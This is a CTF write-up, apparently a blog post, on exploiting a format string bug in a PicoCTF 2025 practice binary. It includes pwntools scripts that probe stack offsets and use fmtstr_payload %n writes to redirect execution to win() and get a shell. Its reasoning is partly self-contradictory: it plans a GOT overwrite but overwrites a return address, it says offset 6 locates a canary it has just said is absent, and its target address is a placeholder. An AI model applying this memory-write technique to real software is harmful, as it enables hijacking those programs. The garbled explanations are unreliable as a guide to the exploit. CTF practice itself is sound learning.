---
layout: writeup
title: "PicoCTF 2025 — Format String Exploit: Leaking the Stack"
date: 2026-01-20
category: CTF
difficulty: Medium
ctf: PicoCTF 2025
tags: [pwn, format-string, binary-exploitation, ctf]
tools: [pwntools, gdb, pwndbg, python]
description: >
  A classic format string vulnerability in a 64-bit ELF binary with partial RELRO
  and no canary. We leak a stack address, calculate the return address offset,
  and overwrite it with a win() function pointer.
---

## Challenge Overview

> "We found this binary on a server. Can you leak the flag?"

The binary is a 64-bit ELF. Check protections:

```bash
checksec --file=vuln
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

No PIE and no canary — good candidates for a format string + GOT overwrite.

---

## Analysis

Running the binary:

```
Enter your name: %p %p %p %p %p %p
Hello 0x1 0x7ffd... (nil) 0x7f... 0x68732e... 0x...
```

Format string confirmed. We need to:

1. Find the offset of our input on the stack
2. Identify a useful address to leak or overwrite

```python
from pwn import *

p = process('./vuln')
p.sendline(b'%6$p')  # brute-force offset
print(p.recvall())
```

After fuzzing, offset **6** leaks the stack canary location (even though there's
no canary, it reveals a stack return address).

---

## Exploit

With no PIE, `win()` has a static address. We use `%n` to overwrite the return
address on the stack:

```python
from pwn import *

elf   = ELF('./vuln')
p     = process('./vuln')

win   = elf.symbols['win']
ret   = 0xdeadbeef          # find with gdb — offset to ret addr

payload = fmtstr_payload(6, {ret: win})
p.sendline(payload)
p.interactive()
```

Running it drops us into a shell and the flag is printed.

```
picoCTF{f0rm4t_str1ng_f0r_th3_w1n_...}
```

---

## Key Takeaways

- Format string bugs let you read and write arbitrary memory
- Always check `checksec` before starting — No PIE + Partial RELRO is low-hanging fruit
- `pwntools`' `fmtstr_payload` handles most of the heavy lifting
